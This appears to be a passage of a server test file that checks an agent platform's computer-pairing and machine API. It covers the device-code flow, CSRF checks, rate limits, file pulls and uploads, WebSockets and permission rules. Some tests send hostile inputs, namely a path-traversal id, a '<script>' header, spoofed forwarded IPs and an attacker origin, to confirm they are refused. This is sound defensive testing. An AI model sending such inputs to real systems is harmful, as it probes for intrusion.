import { afterEach, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { readdirSync, readFileSync, realpathSync } from "node:fs";
import path from "node:path";
import { createDiskBlobStore } from "@agenteschat/adapters";
import {
  ACCESS_ALLOW_PROTOCOL,
  CLI_GIT_MISSING,
  CLI_INSTALL_PROTOCOL,
  MACHINE_PROTOCOL_VERSION,
  type MachineRequest,
  type RunnerPause,
  type ServerFrame,
} from "@agenteschat/adapters/machine-protocol";
import { testConfig } from "@agenteschat/config";
import { eq, schema } from "@agenteschat/db";
import { ARTIFACT_LIMITS, createUpload, issueManagedMachine, setProvisioning } from "@agenteschat/engine";
import { type ModelRequest, systemText } from "@agenteschat/providers";
import { handleRequest } from "../runner/handlers";
import { applyBootSwitches } from "../src/start";
import {
  browser,
  createTestServer,
  joinByInvitation,
  listen,
  ORIGIN,
  pairComputer,
  seedOrg,
  signUp,
  type TestServer,
} from "./harness";
import { removeDirs, tempDir } from "./runner/helpers";

let t: TestServer;
let server: ReturnType<typeof listen> | null = null;
const dirs: string[] = [];
afterEach(async () => {
  if (server) await Promise.race([server.stop(true), Bun.sleep(500)]);
  server = null;
  await t.close();
  removeDirs(dirs);
});

const RUNNER = { hostname: "box", os: "linux", arch: "x64", version: "0.1.0", protocol: 1, workspace: "/srv/agentes" };

/** The runner's own calls: no cookie, no Origin. */
const runnerCall = (path: string, init: RequestInit = {}) => t.app.request(path, init);
const runnerPost = (path: string, body: unknown, ip = "203.0.113.7") =>
  runnerCall(path, {
    method: "POST",
    headers: { "content-type": "application/json", "x-forwarded-for": ip },
    body: JSON.stringify(body),
  });

async function start() {
  t = await createTestServer({ env: { ALLOW_SIGNUP: "true" }, reply: () => ({ chunks: ["ok"] }) });
  const owner = browser(t);
  await signUp(owner, "owner@example.com");
  const seeded = await seedOrg(owner);
  const api = (path: string, init?: Parameters<typeof owner>[1]) =>
    owner(`/api/app/organizations/${seeded.orgId}${path}`, init);
  const pair = (name = "Build box") => pairComputer(t, api, { ...RUNNER, exec: true }, { name });
  return { owner, api, pair, ...seeded };
}

test("connecting over HTTP: code, confirm page, confirm, the token once; errors in the device-flow shape", async () => {
  const { owner, api, orgId } = await start();
  const started = await runnerPost("/api/machines/device", { name: "Build box", ...RUNNER });
  expect(started.status).toBe(200);
  const code = (await started.json()) as { deviceCode: string; userCode: string; verificationUrl: string };
  expect(code).toMatchObject({ expiresIn: 600, interval: 3 });
  expect(code.verificationUrl).toBe(`${ORIGIN}/conectar?code=${code.userCode}`);

  const poll = () => runnerPost("/api/machines/device/token", { deviceCode: code.deviceCode });
  const pending = await poll();
  expect(pending.status).toBe(400);
  expect(await pending.json()).toEqual({ error: "authorization_pending" });
  expect(await (await poll()).json()).toEqual({ error: "slow_down" });

  // The confirm page needs a session; it shows what asked.
  expect((await runnerCall(`/api/app/machines/device/${code.userCode}`)).status).toBe(401);
  const view = await owner(`/api/app/machines/device/${code.userCode}`);
  expect(view.status).toBe(200);
  expect(await view.json()).toMatchObject({ name: "Build box", hostname: "box", os: "linux", approxLocation: null });
  expect((await owner("/api/app/machines/device/AAAAAA")).status).toBe(404);

  // CSRF: another origin can't confirm.
  const cross = await api(`/machines/device/${code.userCode}/confirm`, { json: {}, origin: "https://evil.example" });
  expect(cross.status).toBe(403);
  const confirmed = await api(`/machines/device/${code.userCode}/confirm`, { json: { name: "Servidor" } });
  expect(confirmed.status).toBe(201);
  const machine = (await confirmed.json()) as { id: string; name: string; paused: unknown; access: unknown };
  expect(machine).toMatchObject({ name: "Servidor", paused: null, access: null, agents: [] });

  const token = await poll();
  expect(token.status).toBe(200);
  const body = (await token.json()) as { token: string; machineId: string; org: { id: string } };
  expect(body).toMatchObject({ machineId: machine.id, name: "Servidor", org: { id: orgId, name: "Acme" } });
  expect(body.token).toStartWith("agm_");
  expect(await (await poll()).json()).toEqual({ error: "expired_token" });

  const list = (await (await api("/machines")).json()) as { machines: { id: string; online: boolean }[] };
  expect(list.machines).toEqual([expect.objectContaining({ id: machine.id, name: "Servidor", online: false })]);
  // The old pairing is gone.
  expect((await api("/machines/pairings", { json: { name: "x" } })).status).toBe(404);
  expect((await runnerPost("/api/machines/pair", { code: "AAAA-BBBB" })).status).toBe(404);
});

test("where each workspace gets its own computer the agents read so, and one with none waits for it", async () => {
  const asked: ModelRequest[] = [];
  t = await createTestServer({
    env: {
      MACHINE_PROVISIONING: "external",
      OPERATOR_API_TOKEN: "o".repeat(40),
      BILLING_URL: "https://billing.example.com",
      BILLING_LINK_SECRET: "b".repeat(32),
    },
    reply: (r) => {
      asked.push(r);
      return { chunks: ["Ok."] };
    },
  });
  const owner = browser(t);
  await signUp(owner, "owner@example.com");
  const { orgId, channelId } = await seedOrg(owner);
  await owner(`/api/app/organizations/${orgId}/channels/${channelId}/messages`, { json: { body: "@dev oi" } });
  await t.drain();
  const request = asked.at(-1);
  if (!request) throw new Error("no model call");
  expect(systemText(request.system)).toContain("a bigger plan may bring a bigger one (Settings › Plan and billing)");
  // Paid, nothing reported by the provisioner yet: never "connect one".
  const runCode = request.tools?.find((tool) => tool.name === "run_code");
  expect(runCode?.description).toContain("still being prepared");
  expect(runCode?.description).not.toContain("connect one");
});

test("a server that gives each workspace its own computer lets people bring theirs as targets, never homes; that computer still enrolls", async () => {
  t = await createTestServer({
    env: { ALLOW_SIGNUP: "true", MACHINE_PROVISIONING: "external", OPERATOR_API_TOKEN: "o".repeat(40) },
  });
  const owner = browser(t);
  await signUp(owner, "owner@example.com");
  const { orgId, agentId } = await seedOrg(owner);
  const api = (path: string, init?: Parameters<typeof owner>[1]) =>
    owner(`/api/app/organizations/${orgId}${path}`, init);

  // Someone's own computer connects through the usual code; booted as the Cloud boots, it can't be an agent's home.
  const brought = await pairComputer(t, api, { ...RUNNER, exec: true }, { name: "Build box" });
  applyBootSwitches(t.config);
  try {
    const home = await api(`/agents/${agentId}/computer/target`, {
      method: "PUT",
      json: { machineId: brought.machineId },
    });
    expect(home.status).toBe(403);
    expect(((await home.json()) as { error: { code: string } }).error.code).toBe("device.not_home");
  } finally {
    applyBootSwitches(testConfig());
  }

  // The workspace's own computer redeems the code it was issued.
  const issued = await issueManagedMachine({ db: t.db }, orgId);
  const redeemed = await runnerPost("/api/machines/device/token", { deviceCode: issued?.enrollCode });
  expect(redeemed.status).toBe(200);
  expect(await redeemed.json()).toMatchObject({ machineId: issued?.machineId, org: { id: orgId } });

  // Its people see the time left, counted by the server, and that this server emails the owners.
  await setProvisioning({ db: t.db }, orgId, {
    state: "preparing",
    step: "installing",
    expectedReadyAt: new Date(Date.now() + 360_000),
  });
  const setup = (await (await owner(`/api/app/organizations/${orgId}/computer-setup`)).json()) as Record<
    string,
    unknown
  >;
  expect(setup).toMatchObject({ mode: "external", state: "preparing", step: "installing", notifyByEmail: true });
  expect(setup.secondsLeft).toBeGreaterThan(350);
  expect(setup.secondsWaited).toEqual(expect.any(Number));
  expect(setup).not.toHaveProperty("etaSeconds");
  expect(setup).not.toHaveProperty("secondsSteady");
});

test("\"it wasn't me\", outsiders can't confirm, and new codes are rate limited per address", async () => {
  const { api, orgId } = await start();
  const denied = (await (await runnerPost("/api/machines/device", { name: "x", ...RUNNER })).json()) as {
    deviceCode: string;
    userCode: string;
  };
  const stranger = browser(t);
  await signUp(stranger, "zed@example.com");
  // Signed in but not a member: can deny a code shown to them, never connect it to someone else's org.
  const outsider = await stranger(`/api/app/organizations/${orgId}/machines/device/${denied.userCode}/confirm`, {
    json: {},
  });
  expect(outsider.status).toBe(403);
  const deny = await stranger(`/api/app/machines/device/${denied.userCode}/deny`, { method: "POST", json: {} });
  expect(deny.status).toBe(204);
  expect(await (await runnerPost("/api/machines/device/token", { deviceCode: denied.deviceCode })).json()).toEqual({
    error: "access_denied",
  });
  expect((await api(`/machines/device/${denied.userCode}/confirm`, { json: {} })).status).toBe(404);

  // 10 new codes a minute per address (and at most 10 pending).
  const statuses: number[] = [];
  for (let i = 0; i < 11; i++) statuses.push((await runnerPost("/api/machines/device", RUNNER, "198.51.100.1")).status);
  expect(statuses.slice(0, 10).every((s) => s === 200)).toBe(true);
  expect(statuses[10]).toBe(429);
  expect((await runnerPost("/api/machines/device", RUNNER, "198.51.100.2")).status).toBe(200);
});

test("guessing codes: lookup, confirm and deny share one budget per person, and unknown codes cost more", async () => {
  const { owner, api } = await start();
  const real = (await (await runnerPost("/api/machines/device", { name: "x", ...RUNNER })).json()) as {
    userCode: string;
  };
  // Six misses (confirm or deny alike) spend a person's budget for 10 minutes.
  const statuses: number[] = [];
  for (const code of ["AAAAAA", "AAAAAB", "AAAAAC"]) {
    statuses.push((await api(`/machines/device/${code}/confirm`, { json: {} })).status);
    statuses.push((await owner(`/api/app/machines/device/${code}/deny`, { method: "POST", json: {} })).status);
  }
  expect(statuses).toEqual([404, 404, 404, 404, 404, 404]);
  // Then even a real code is refused, on every one of the three.
  expect((await api(`/machines/device/${real.userCode}/confirm`, { json: {} })).status).toBe(429);
  expect((await owner(`/api/app/machines/device/${real.userCode}/deny`, { method: "POST", json: {} })).status).toBe(
    429,
  );
  expect((await owner(`/api/app/machines/device/${real.userCode}`)).status).toBe(429);
  // Someone else (same address, under its larger budget) still sees it.
  const other = browser(t);
  await signUp(other, "bia@example.com");
  expect((await other(`/api/app/machines/device/${real.userCode}`)).status).toBe(200);
});

test("install.sh is served without a session, never cached", async () => {
  t = await createTestServer();
  const res = await runnerCall("/api/machines/install.sh");
  expect(res.status).toBe(200);
  expect(res.headers.get("content-type")).toContain("text/x-shellscript");
  expect(res.headers.get("cache-control")).toBe("no-store");
  const script = await res.text();
  expect(script).toStartWith("#!/bin/sh");
  expect(script).toContain(ORIGIN);
});

test("pulls GET: machine token, its own pull only, the stored bytes once", async () => {
  const { pair, orgId } = await start();
  const a = await pair("A");
  const b = await pair("B");
  const { store, prefix, storageConfigId } = await t.engine.artifacts.blobs.forOrg(orgId);
  const blobKey = `${prefix}pull-test`;
  await store.put(blobKey, new TextEncoder().encode("%PDF-1.4 hello"), { contentType: "application/pdf" });
  const [pull] = await t.db
    .insert(schema.machineFilePulls)
    .values({
      orgId,
      machineId: a.machineId,
      storageConfigId,
      blobKey,
      size: 14,
      expiresAt: new Date(Date.now() + 60_000),
    })
    .returning();
  const url = `/api/machines/pulls/${pull?.id}`;
  const get = (token: string, path = url) => runnerCall(path, { headers: { authorization: `Bearer ${token}` } });
  const code = async (res: Response) => ((await res.json()) as { error: { code: string } }).error.code;

  expect((await runnerCall(url)).status).toBe(401);
  expect((await get("agm_nope")).status).toBe(401);
  const wrong = await get(b.token);
  expect(wrong.status).toBe(404);
  expect(await code(wrong)).toBe("pull.not_found");
  expect((await get(a.token, "/api/machines/pulls/..%2F..%2Fsecret")).status).toBe(404);
  expect((await get(a.token, `/api/machines/pulls/${"-".repeat(36)}`)).status).toBe(404);

  const res = await get(a.token);
  expect(res.status).toBe(200);
  expect(await res.text()).toBe("%PDF-1.4 hello");
  expect(res.headers.get("content-type")).toBe("application/octet-stream");
  expect(res.headers.get("content-length")).toBe("14");
  expect(res.headers.get("cache-control")).toBe("no-store");
  const again = await get(a.token);
  expect(again.status).toBe(404);
  expect(await code(again)).toBe("pull.not_found");
});

test("a pull end to end: the route on a real socket, streamed from a disk store, to the runner's own code", async () => {
  const { pair, orgId } = await start();
  const a = await pair("A");
  const dir = tempDir();
  dirs.push(dir);
  const ws = tempDir();
  dirs.push(ws);
  const disk = createDiskBlobStore(dir);
  const { store, prefix, storageConfigId } = await t.engine.artifacts.blobs.forOrg(orgId);
  store.stream = disk.stream;
  const bytes = new Uint8Array(ARTIFACT_LIMITS.fileBytes);
  for (let at = 0; at < bytes.length; at += 4099) bytes[at] = at % 251;
  const sha256 = createHash("sha256").update(bytes).digest("hex");
  const blobKey = `${prefix}big`;
  await disk.put(blobKey, bytes, { contentType: "application/zip" });
  const row = () =>
    t.db
      .insert(schema.machineFilePulls)
      .values({
        orgId,
        machineId: a.machineId,
        storageConfigId,
        blobKey,
        size: bytes.length,
        expiresAt: new Date(Date.now() + 60_000),
      })
      .returning();
  const [pull] = await row();
  server = listen(t);
  const url = `${ORIGIN}/api/machines/pulls/${pull?.id}`;
  const ctx = {
    workspaceReal: realpathSync(ws),
    exec: false,
    token: a.token,
    server: `http://127.0.0.1:${server.port}`,
  };
  const req = { op: "pull", path: "in/big.zip", url, pullId: pull?.id, size: bytes.length, sha256 } as MachineRequest;
  const scope = { signal: new AbortController().signal, output: () => {} };
  expect(await handleRequest(ctx, req, scope)).toEqual({ size: bytes.length, sha256 });
  expect(
    createHash("sha256")
      .update(readFileSync(path.join(ws, "in/big.zip")))
      .digest("hex"),
  ).toBe(sha256);
  expect(readdirSync(path.join(ws, "in"))).toEqual(["big.zip"]);

  // The same request again: the first fetch used it, and the file there stays whole.
  await expect(handleRequest(ctx, req, scope)).rejects.toThrow("This file isn't waiting for this computer");
  expect(readdirSync(path.join(ws, "in"))).toEqual(["big.zip"]);

  // What was recorded no longer matches what is stored: refused, whatever the server sends.
  const [other] = await row();
  const wrong = { ...req, url: `${ORIGIN}/api/machines/pulls/${other?.id}`, pullId: other?.id, sha256: "0".repeat(64) };
  await expect(handleRequest(ctx, wrong as MachineRequest, scope)).rejects.toThrow("it arrived damaged");
  expect(readdirSync(path.join(ws, "in"))).toEqual(["big.zip"]);
}, 60_000);

test("uploads PUT: machine token, its own upload only, size refused before reading", async () => {
  const { pair, orgId, agentId, channelId } = await start();
  const a = await pair("A");
  const b = await pair("B");
  const upload = await createUpload(t.db, {
    orgId,
    agentId,
    channelId,
    computer: `machine:${a.machineId}`,
    machineId: a.machineId,
    path: "out/report.pdf",
    title: "Report",
  });
  const body = new TextEncoder().encode("%PDF-1.4 hello");
  const headers = (token: string) => ({
    authorization: `Bearer ${token}`,
    "content-type": "application/pdf",
    "x-agentes-file-name": encodeURIComponent("relatório.pdf"),
    "x-agentes-sha256": createHash("sha256").update(body).digest("hex"),
    "x-agentes-upload-id": upload.id,
  });
  const put = (token: string, data: Uint8Array = body) =>
    runnerCall(`/api/machines/uploads/${upload.id}`, { method: "PUT", headers: headers(token), body: data });

  expect((await put("agm_nope")).status).toBe(401);
  expect((await runnerCall(`/api/machines/uploads/${upload.id}`, { method: "PUT", body })).status).toBe(401);
  const wrong = await put(b.token);
  expect(wrong.status).toBe(403);
  expect(((await wrong.json()) as { error: { code: string } }).error.code).toBe("upload.wrong_machine");

  const big = new Uint8Array(ARTIFACT_LIMITS.fileBytes + 128 * 1024);
  const tooBig = await put(a.token, big);
  expect(tooBig.status).toBe(413);

  const ok = await put(a.token);
  expect(ok.status).toBe(200);
  const done = (await ok.json()) as { ok: boolean; artifactId: string; version: number };
  expect(done).toMatchObject({ ok: true, version: 1 });
  expect(done.artifactId).toMatch(/^[0-9a-f-]{36}$/);
  // Once only.
  expect((await put(a.token)).status).toBe(409);
});

test("rename, delete, target and the computer view; deleting revokes the token", async () => {
  const { api, pair, agentId } = await start();
  const { machineId, token } = await pair();
  const renamed = await api(`/machines/${machineId}`, { method: "PATCH", json: { name: "Laptop" } });
  expect(await renamed.json()).toEqual({ id: machineId, name: "Laptop" });

  const target = await api(`/agents/${agentId}/computer/target`, { method: "PUT", json: { machineId } });
  expect(await target.json()).toEqual({ kind: "machine", machineId, name: "Laptop", online: false });
  expect(await (await api(`/agents/${agentId}/computer`)).json()).toMatchObject({
    target: { kind: "machine", machineId, name: "Laptop" },
  });
  const list = (await (await api("/machines")).json()) as { machines: { agents: { id: string }[] }[] };
  expect(list.machines[0]?.agents.map((a) => a.id)).toEqual([agentId]);

  // CSRF: another origin can't change anything.
  const cross = await api(`/machines/${machineId}`, { method: "DELETE", origin: "https://evil.example" });
  expect(cross.status).toBe(403);

  expect((await api(`/machines/${machineId}`, { method: "DELETE" })).status).toBe(204);
  expect(await (await api(`/agents/${agentId}/computer`)).json()).toMatchObject({ target: { kind: "none" } });
  const upload = await runnerCall(`/api/machines/uploads/${crypto.randomUUID()}`, {
    method: "PUT",
    headers: { authorization: `Bearer ${token}` },
    body: "x",
  });
  expect(upload.status).toBe(401);
  expect(
    (await api(`/agents/${agentId}/computer/target`, { method: "PUT", json: { machineId: crypto.randomUUID() } }))
      .status,
  ).toBe(404);
});

test("reconnecting over HTTP: the removed computer comes back with its agent; a junk id is a new computer", async () => {
  const { owner, api, pair, agentId } = await start();
  const { machineId, token: oldToken } = await pair("Laptop");
  await api(`/agents/${agentId}/computer/target`, { method: "PUT", json: { machineId } });
  expect((await api(`/machines/${machineId}`, { method: "DELETE" })).status).toBe(204);

  // The id alone (every member sees it) proves nothing: an ordinary new computer.
  const unproved = await runnerPost(
    "/api/machines/device",
    { name: "z", ...RUNNER, previousMachineId: machineId },
    "203.0.113.9",
  );
  const unprovedCode = (await unproved.json()) as { userCode: string };
  const unprovedView = (await (await owner(`/api/app/machines/device/${unprovedCode.userCode}`)).json()) as {
    reconnect?: unknown;
  };
  expect(unprovedView.reconnect).toBeUndefined();

  const started = await runnerPost("/api/machines/device", {
    name: "x",
    ...RUNNER,
    previousMachineId: machineId,
    previousToken: oldToken,
  });
  const code = (await started.json()) as { deviceCode: string; userCode: string };
  const view = await owner(`/api/app/machines/device/${code.userCode}`);
  expect(await view.json()).toMatchObject({ reconnect: { machineId, name: "Laptop", orgName: "Acme" } });
  const confirmed = await api(`/machines/device/${code.userCode}/confirm`, { json: {} });
  expect(await confirmed.json()).toMatchObject({ id: machineId, name: "Laptop" });
  const token = await runnerPost("/api/machines/device/token", { deviceCode: code.deviceCode });
  expect(await token.json()).toMatchObject({ machineId, name: "Laptop" });
  expect(await (await api(`/agents/${agentId}/computer`)).json()).toMatchObject({
    target: { kind: "machine", machineId },
  });

  const junk = await runnerPost(
    "/api/machines/device",
    { name: "y", ...RUNNER, previousMachineId: "nope" },
    "203.0.113.8",
  );
  expect(junk.status).toBe(200);
  const junkCode = (await junk.json()) as { userCode: string };
  const junkView = (await (await owner(`/api/app/machines/device/${junkCode.userCode}`)).json()) as {
    reconnect?: unknown;
  };
  expect(junkView.reconnect).toBeUndefined();
});

test("the runner's WebSocket: no Origin, hello → welcome, online in the list", async () => {
  const { api, pair } = await start();
  const { machineId, token } = await pair();
  server = listen(t);
  const url = `ws://127.0.0.1:${server.port}/api/machines/connect`;

  // A browser (Origin present) is refused.
  const refused = await fetch(url.replace("ws://", "http://"), {
    headers: {
      origin: ORIGIN,
      connection: "Upgrade",
      upgrade: "websocket",
      "sec-websocket-version": "13",
      "sec-websocket-key": "dGhlIHNhbXBsZSBub25jZQ==",
    },
  });
  expect(refused.status).toBe(403);

  const ws = new WebSocket(url);
  const frames: { type: string }[] = [];
  const welcome = new Promise<{ type: string; machineId?: string }>((resolve, reject) => {
    ws.onmessage = (e) => {
      const frame = JSON.parse(String(e.data)) as { type: string };
      frames.push(frame);
      if (frame.type === "welcome") resolve(frame);
    };
    ws.onclose = () => reject(new Error(`closed; frames: ${JSON.stringify(frames)}`));
    setTimeout(() => reject(new Error("timeout")), 5000);
  });
  await new Promise<void>((resolve) => {
    ws.onopen = () => resolve();
  });
  const desktopUse = { available: false, reason: "Install what desktop use needs: …", code: "desktop_use_install" };
  ws.send(JSON.stringify({ type: "hello", token, ...RUNNER, exec: true, desktopUse }));
  expect(await welcome).toMatchObject({ type: "welcome", machineId });
  const list = (await (await api("/machines")).json()) as { machines: { online: boolean }[] };
  expect(list.machines[0]).toMatchObject({ online: true, desktopUse });
  ws.onclose = null;
  ws.close();
});

test("the public IP echo returns an observed address and country without credentials or caching", async () => {
  t = await createTestServer();
  const res = await runnerCall("/api/machines/ip", { headers: { "x-forwarded-for": "8.8.8.8", "cf-ipcountry": "US" } });
  expect(res.status).toBe(200);
  expect(res.headers.get("cache-control")).toBe("no-store");
  expect(await res.json()).toEqual({ ip: "8.8.8.8", country: "US" });
  const unknown = await runnerCall("/api/machines/ip", {
    headers: { "x-forwarded-for": "not-an-ip", "cf-ipcountry": "XX" },
  });
  expect(await unknown.json()).toEqual({ ip: null, country: null });
});

test("the IP echo ignores a spoofed leftmost hop and a trusted reverse proxy", async () => {
  t = await createTestServer({ env: { TRUSTED_PROXIES: "203.0.113.10" } });
  const res = await runnerCall("/api/machines/ip", {
    headers: {
      "x-forwarded-for": "1.1.1.1, 8.8.8.8, 203.0.113.10",
      "x-real-ip": "9.9.9.9",
      "cf-ipcountry": "<script>",
    },
  });
  expect(await res.json()).toEqual({ ip: "8.8.8.8", country: null });
});

test("pause from the apps: whoever connected it and admins, through the hub; anyone else 403", async () => {
  const { owner, orgId } = await start();
  const orgApi = (b: typeof owner) => (path: string, init?: Parameters<typeof owner>[1]) =>
    b(`/api/app/organizations/${orgId}${path}`, init);
  const bia = await joinByInvitation(t, owner, orgId, "bia@example.com");
  const caio = await joinByInvitation(t, owner, orgId, "caio@example.com");
  const runner = { ...RUNNER, protocol: MACHINE_PROTOCOL_VERSION };
  const paired = await pairComputer(t, orgApi(bia), { ...runner, exec: true }, { name: "Bia's Mac" });
  const hub = t.engine.machineHub;
  const sent: Extract<MachineRequest, { op: "pause.set" }>[] = [];
  let state: RunnerPause = { paused: false };
  const conn = hub.open({
    send(text: string) {
      const frame = JSON.parse(text) as ServerFrame;
      if (frame.type !== "request" || frame.op !== "pause.set") return;
      sent.push(frame);
      state = frame.paused ? { paused: true, until: frame.until ?? null, by: frame.by } : { paused: false };
      const result = JSON.stringify({ type: "result", id: frame.id, ok: true, data: { paused: state } });
      setTimeout(() => void hub.message(conn, result), 1);
    },
    close() {},
  });
  await hub.message(conn, JSON.stringify({ type: "hello", token: paired.token, ...runner, exec: true }));
  const me = async (b: typeof owner) => ((await (await b("/api/app/me")).json()) as { user: { id: string } }).user.id;
  const path = `/machines/${paired.machineId}`;

  const listed = (await (await orgApi(owner)("/machines")).json()) as { machines: { remotePause: boolean }[] };
  expect(listed.machines[0]?.remotePause).toBe(true);

  // Someone who neither connected it nor administers the workspace.
  expect((await orgApi(caio)(`${path}/pause`, { json: { until: null } })).status).toBe(403);
  expect((await orgApi(caio)(`${path}/resume`, { json: {} })).status).toBe(403);
  expect(sent).toHaveLength(0);

  // Whoever connected it: the computer applies the pause, and the row says who did it.
  const until = new Date(Date.now() + 3600_000).toISOString();
  const byBia = await orgApi(bia)(`${path}/pause`, { json: { until } });
  expect(byBia.status).toBe(200);
  const biaId = await me(bia);
  expect(await byBia.json()).toEqual({ paused: { until, by: { id: biaId, name: expect.any(String) } } });
  expect(sent[0]).toMatchObject({ op: "pause.set", paused: true, until, by: biaId });
  const view = (await (await orgApi(caio)("/machines")).json()) as {
    machines: { paused: { until: string | null; by: { id: string } | null } | null }[];
  };
  expect(view.machines[0]?.paused).toMatchObject({ until, by: { id: biaId } });
  expect((await orgApi(bia)(`${path}/pause`, { json: { until: "2001-01-01T00:00:00Z" } })).status).toBe(400);

  // A runner naming someone outside the workspace: the pause stands, nobody is named, and the row stays writable.
  await hub.message(
    conn,
    JSON.stringify({ type: "runner.state", paused: { paused: true, until, by: "not-a-member" } }),
  );
  const outsider = (await (await orgApi(owner)("/machines")).json()) as typeof view;
  expect(outsider.machines[0]?.paused).toMatchObject({ until, by: null });

  // An admin resumes it; a paused computer still takes the resume.
  const resumed = await orgApi(owner)(`${path}/resume`, { json: {} });
  expect(resumed.status).toBe(200);
  expect(await resumed.json()).toEqual({ paused: null });
  expect(sent.at(-1)).toMatchObject({ op: "pause.set", paused: false, by: await me(owner) });
}, 30_000);

test("a tool turned on from the apps: only whoever connected it; anyone else asks them, and their row goes once it's on", async () => {
  const { owner, orgId } = await start();
  const orgApi = (b: typeof owner) => (path: string, init?: Parameters<typeof owner>[1]) =>
    b(`/api/app/organizations/${orgId}${path}`, init);
  const bia = await joinByInvitation(t, owner, orgId, "bia@example.com");
  const caio = await joinByInvitation(t, owner, orgId, "caio@example.com");
  const runner = { ...RUNNER, os: "darwin", protocol: MACHINE_PROTOCOL_VERSION };
  const paired = await pairComputer(t, orgApi(bia), { ...runner, exec: true }, { name: "Bia's Mac" });
  const hub = t.engine.machineHub;
  const sent: Extract<MachineRequest, { op: "access.allow" }>[] = [];
  const tools = { claude: false, codex: false, commands: true, browser: false };
  const conn = hub.open({
    send(text: string) {
      const frame = JSON.parse(text) as ServerFrame;
      if (frame.type !== "request" || frame.op !== "access.allow") return;
      sent.push(frame);
      tools[frame.tool as "browser"] = true;
      const data = { access: { folders: [], tools: { ...tools } } };
      setTimeout(() => void hub.message(conn, JSON.stringify({ type: "result", id: frame.id, ok: true, data })), 1);
    },
    close() {},
  });
  await hub.message(
    conn,
    JSON.stringify({
      type: "hello",
      token: paired.token,
      ...runner,
      exec: true,
      access: { folders: [], tools: { ...tools } },
    }),
  );
  const path = `/machines/${paired.machineId}/access`;
  const listed = (await (await orgApi(bia)("/machines")).json()) as { machines: { accessAllow: boolean }[] };
  expect(listed.machines[0]?.accessAllow).toBe(true);

  // Not their computer: an admin and a member alike are refused, and nothing reaches it.
  for (const who of [owner, caio]) {
    const refused = await orgApi(who)(`${path}/allow`, { json: { tool: "browser" } });
    expect(refused.status).toBe(403);
    expect(((await refused.json()) as { error: { code: string } }).error.code).toBe("machine.not_owner");
  }
  expect(sent).toHaveLength(0);

  // Caio asks: Bia gets one waiting row with the computer and the tool.
  expect((await orgApi(caio)(`${path}/ask`, { json: { tool: "browser" } })).status).toBe(200);
  expect((await orgApi(caio)(`${path}/ask`, { json: { tool: "browser" } })).status).toBe(200);
  type Inbox = { items: { kind: string; waiting: boolean; doneAt: string | null; latest: { reason?: string } }[] };
  const inbox = async () => ((await (await orgApi(bia)("/notifications")).json()) as Inbox).items;
  const asks = (await inbox()).filter((n) => n.kind === "device.tool_request");
  expect(asks).toEqual([
    expect.objectContaining({ waiting: true, latest: expect.objectContaining({ reason: "browser" }) }),
  ]);
  // Her own computer: she turns it on herself.
  expect((await orgApi(bia)(`${path}/ask`, { json: { tool: "browser" } })).status).toBe(409);

  // Bia turns it on: the computer gets her name to tell whoever is at it, the copy is stored, her row is done.
  const allowed = await orgApi(bia)(`${path}/allow`, { json: { tool: "browser" } });
  expect(allowed.status).toBe(200);
  expect(((await allowed.json()) as { access: { tools: { browser: boolean } } }).access.tools.browser).toBe(true);
  expect(sent[0]).toMatchObject({ op: "access.allow", tool: "browser", byName: expect.any(String) });
  const stored = (await (await orgApi(bia)("/machines")).json()) as {
    machines: { access: { tools: { browser?: boolean } } | null }[];
  };
  expect(stored.machines[0]?.access?.tools.browser).toBe(true);
  expect((await inbox()).filter((n) => n.kind === "device.tool_request")).toHaveLength(0);

  // Turned on at the computer itself: the ask is answered all the same.
  expect((await orgApi(caio)(`${path}/ask`, { json: { tool: "codex" } })).status).toBe(200);
  expect((await inbox()).filter((n) => n.kind === "device.tool_request")).toHaveLength(1);
  tools.codex = true;
  await hub.message(conn, JSON.stringify({ type: "access.changed", access: { folders: [], tools: { ...tools } } }));
  expect((await inbox()).filter((n) => n.kind === "device.tool_request")).toHaveLength(0);

  // A tool the API doesn't know is refused before anything is sent.
  expect((await orgApi(bia)(`${path}/allow`, { json: { tool: "everything" } })).status).toBe(400);

  // An app too old for it says to update it; one that is off says so.
  const old = await pairComputer(
    t,
    orgApi(bia),
    { ...runner, protocol: ACCESS_ALLOW_PROTOCOL - 1, exec: true },
    {
      name: "Bia's old Mac",
    },
  );
  const outdated = await orgApi(bia)(`/machines/${old.machineId}/access/allow`, { json: { tool: "browser" } });
  expect(outdated.status).toBe(400);
  expect(((await outdated.json()) as { error: { code: string } }).error.code).toBe("machine.access_outdated");
  const away = await pairComputer(t, orgApi(bia), { ...runner, exec: true }, { name: "Bia's laptop" });
  const offline = await orgApi(bia)(`/machines/${away.machineId}/access/allow`, { json: { tool: "browser" } });
  expect(offline.status).toBe(409);
  expect(((await offline.json()) as { error: { code: string } }).error.code).toBe("machine.offline");
  expect(sent).toHaveLength(1);
}, 30_000);

test("a folder asked for from the apps: the app on the computer is asked, by whoever manages it; without the app it says so", async () => {
  const { owner, orgId } = await start();
  const orgApi = (b: typeof owner) => (path: string, init?: Parameters<typeof owner>[1]) =>
    b(`/api/app/organizations/${orgId}${path}`, init);
  const bia = await joinByInvitation(t, owner, orgId, "bia@example.com");
  const caio = await joinByInvitation(t, owner, orgId, "caio@example.com");
  const runner = { ...RUNNER, os: "darwin", protocol: MACHINE_PROTOCOL_VERSION };
  const paired = await pairComputer(t, orgApi(bia), { ...runner, exec: true }, { name: "Bia's Mac" });
  const hub = t.engine.machineHub;
  const sent: Extract<MachineRequest, { op: "access.pick" }>[] = [];
  const conn = hub.open({
    send(text: string) {
      const frame = JSON.parse(text) as ServerFrame;
      if (frame.type !== "request" || frame.op !== "access.pick") return;
      sent.push(frame);
      const data = { asked: true };
      setTimeout(() => void hub.message(conn, JSON.stringify({ type: "result", id: frame.id, ok: true, data })), 1);
    },
    close() {},
  });
  const hello = (over: object, on = conn) =>
    hub.message(on, JSON.stringify({ type: "hello", token: paired.token, ...runner, exec: true, ...over }));
  const path = `/machines/${paired.machineId}/access/pick`;
  type Listed = { machines: { id: string; folderPick: boolean }[] };
  const pickable = async () =>
    ((await (await orgApi(bia)("/machines")).json()) as Listed).machines.find((m) => m.id === paired.machineId)
      ?.folderPick;

  // A runner installed from the terminal: no app to pick in, and the apps show the command instead.
  await hello({}, hub.open({ send() {}, close() {} }));
  expect(await pickable()).toBe(false);
  const noApp = await orgApi(bia)(path, { json: {} });
  expect(noApp.status).toBe(400);
  expect(((await noApp.json()) as { error: { code: string } }).error.code).toBe("machine.no_app");

  await hello({ app: true });
  expect(await pickable()).toBe(true);
  // Only an admin or whoever connected it asks; a member doesn't.
  const refused = await orgApi(caio)(path, { json: {} });
  expect(refused.status).toBe(403);
  expect(sent).toHaveLength(0);
